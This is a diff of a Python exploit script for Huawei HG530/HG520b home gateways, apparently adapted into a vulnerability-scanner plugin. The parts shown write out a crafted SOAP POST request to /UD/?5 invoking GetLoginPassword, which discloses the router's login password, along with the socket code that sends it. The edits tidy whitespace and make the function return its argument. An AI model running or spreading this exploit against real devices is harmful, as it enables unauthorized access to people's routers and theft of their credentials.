@@ -1,5 +1,5 @@
-#!/usr/bin/env python 
-# -*- coding: utf-8 -*- 
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 # Exploit Title: Huawei Home Gateway password disclosure
 # Date: June 27, 2015
 # Exploit Author: Fady Mohamed Osman (@fady_osman)
@@ -9,7 +9,7 @@
 # Tested on: HG530 - HG520b (Provided by TE-DATA egypt)
 # Exploit-db : http://www.exploit-db.com/author/?a=2986
 # Youtube : https://www.youtube.com/user/cutehack3r
- 
+
 import re
 import urlparse
 import socket
@@ -27,13 +27,13 @@ def audit(arg):
         host_port=host.split(':')
         host=host_port[0]
         port=int(host_port[1])
-    try:    
-        hahasend(host,port)
+    try:
+        return hahasend(host,port,arg)
     except:
         pass
 
 
-def hahasend(host,port):
+def hahasend(host,port,arg):
     timeout = 20
     socket.setdefaulttimeout(timeout)
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -48,7 +48,7 @@ def hahasend(host,port):
     message = "POST /UD/?5 HTTP/1.1\r\n"
     message += "SOAPACTION: \"urn:dslforum-org:service:UserInterface:1#GetLoginPassword\"\r\n"
     message += "Content-Type: text/xml; charset=\"utf-8\"\r\n"
-    message += "Host:" + target_host + "\r\n"
+    message += "Host:" + host + "\r\n"
     message += "Content-Length:" + str(len(soap)) +"\r\n"
     message += "Expect: 100-continue\r\n"
     message += "Connection: Keep-Alive\r\n\r\n"
@@ -67,6 +67,7 @@ def hahasend(host,port):
 
 
 
-if __name__ == '__main__': 
-    from dummy import * 
-    audit(assign('www', 'http://www.example.com/')[1])
+
+        return arg
+if __name__== '__main__':
+    from dummy import *
